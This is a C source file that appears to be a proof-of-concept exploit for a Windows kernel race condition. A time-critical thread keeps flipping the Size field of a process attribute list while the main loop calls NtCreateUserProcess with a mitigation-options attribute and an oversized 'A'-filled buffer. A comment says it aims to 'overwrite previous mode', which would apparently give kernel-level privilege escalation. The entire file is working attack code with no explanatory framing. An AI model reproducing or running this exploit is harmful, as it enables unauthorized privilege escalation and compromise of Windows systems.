#include <Windows.h>
#include <stdio.h>

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ PVOID ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ PVOID ProcessObjectAttributes,
    _In_opt_ PVOID ThreadObjectAttributes,
    _In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_*
    _In_ ULONG ThreadFlags, // THREAD_CREATE_FLAGS_*
    _In_opt_ PVOID ProcessParameters, // PRTL_USER_PROCESS_PARAMETERS
    _Inout_ PVOID CreateInfo,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

PS_ATTRIBUTE_LIST* attrs;
SIZE_T* size_ptr = NULL;

// racing thread
DWORD smash_func(LPVOID unused)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    while (1) {
        *size_ptr ^= MAXUINT64; // constantly flip attrs.Attributes[0].Size
    }

    return 0;
}

int main(int argc, char** argv)
{   
    BYTE smash_buf[0x8000];
    memset(smash_buf, 'A', sizeof(smash_buf));
    memset(smash_buf, 0, 0x18);
    smash_buf[0x80] = 0; // overwrite previous mode

    // set up the global attributes
    attrs = malloc(sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE));
    memset(attrs, 0, sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE));
    attrs->TotalLength = sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE);
    attrs->Attributes[0].Attribute = 0x2001b; // mitigation options
    attrs->Attributes[0].Size = 0x18;
    attrs->Attributes[0].ValuePtr = smash_buf;

    size_ptr = &attrs->Attributes[0].Size;

    CreateThread(NULL, 0, smash_func, NULL, 0, NULL);

    HANDLE thread_handle = 0;
    HANDLE process_handle = 0;

    while (1)
    {
        NtCreateUserProcess(&process_handle, &thread_handle, 0, 0, 0, 0, 0, 0, 0, 0, attrs);
    }


    return 0;
}
